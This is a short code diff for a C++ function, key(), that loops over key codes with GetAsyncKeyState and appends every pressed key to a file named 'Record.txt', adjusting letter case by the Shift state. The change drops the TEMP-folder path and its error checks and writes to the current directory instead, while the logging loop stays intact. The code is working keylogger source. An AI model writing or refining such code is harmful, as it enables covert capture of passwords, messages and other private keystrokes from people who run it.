@@ -10,15 +10,6 @@ void key();
 void key()
 {
     char c;
-    const char *tempPath = getenv("TEMP");
-    if (!tempPath)
-    {
-        cerr << "Failed to get TEMP directory." << endl;
-        return;
-    }
-
-    string filePath = string(tempPath) + "\\Record.txt"; // Ensure backslash is added
-    cout << "Writing to: " << filePath << endl;          // Debug: Print the file path
 
     for (;;)
     {
@@ -26,12 +17,8 @@ void key()
         {
             if (GetAsyncKeyState(c) == -32767)
             {
-                ofstream write(filePath, ios::app);
-                if (!write) // Check if file opening failed
-                {
-                    cerr << "Failed to open file at " << filePath << endl;
-                    return; // Exit if file cannot be opened
-                }
+                ofstream write("Record.txt", ios::app);
+
                 if (((c > 64) && (c < 91)) && !(GetAsyncKeyState(0x10)))
                 {
                     c += 32;
